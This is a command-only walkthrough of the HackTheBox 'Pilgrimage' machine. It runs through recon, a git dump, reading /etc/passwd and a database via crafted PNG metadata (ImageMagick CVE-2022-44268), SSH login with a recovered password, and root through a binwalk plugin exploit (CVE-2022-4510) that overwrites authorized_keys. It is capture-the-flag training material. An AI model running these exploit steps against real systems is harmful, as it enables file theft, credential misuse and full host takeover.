# 🛐 HTB: Pilgrimage

## 📡 Recon

```bash
nmap -p- --min-rate 10000 10.10.11.219
nmap -p 22,80 -sCV 10.10.11.219
nmap -p 22,80 -sCV pilgrimage.htb
```

### Add to `/etc/hosts`

```bash
echo "10.10.11.219 pilgrimage.htb" | sudo tee -a /etc/hosts
```

### Directory and subdomain fuzzing

```bash
ffuf -u http://pilgrimage.htb -H "Host: FUZZ.pilgrimage.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
feroxbuster -u http://pilgrimage.htb -x php
```

## 📥 Git Dump / Source Discovery

```bash
pipx install git-dumper
git-dumper http://pilgrimage.htb .git-dump
```

## 🧙 ImageMagick File Read — CVE-2022-44268

### Manual image with malicious metadata

```bash
pngcrush -text a "profile" "/etc/passwd" input.png
mv pngout.png malicious.png
```

### Identify output

```bash
identify -verbose shrunked_file.png
```

### Extract raw data from profile

```bash
identify -verbose shrunked.png | grep -Pv "^( |Image)" | xxd -r -p > outputfile
```

### Python POC

```bash
python CVE-2022-44268.py --image input.png --file-to-read /etc/passwd --output malicious.png
python CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/<filename>.png
```

## 🧬 SQLite Extraction

```bash
sqlite3 pilgrimage.sqlite
.tables
.schema users
SELECT * FROM users;
```

## 🔐 [Initial Shell as emily](SSH)

```bash
sshpass -p abigchonkyboi123 ssh emily@pilgrimage.htb
```

## 🔎 Enumeration (Local)

```bash
ps auxww
sudo -l
find / -perm -4000 -user root 2>/dev/null
```

### Test `inotifywait`

```bash
inotifywait -m -e create /dev/shm
echo "test" > /dev/shm/test.txt
```

## 🐚 Root PrivEsc — Binwalk Plugin Abuse (CVE-2022-4510)

### Check version

```bash
binwalk -h
```

### Create plugin image exploit (SSH via `authorized_keys` overwrite)

```bash
python walkingpath.py ssh exploit.png ~/keys/ed25519_gen.pub
```

### Upload it into monitored folder

```bash
scp binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/
```

### Get root shell

```bash
ssh -i ~/keys/ed25519_gen root@pilgrimage.htb
```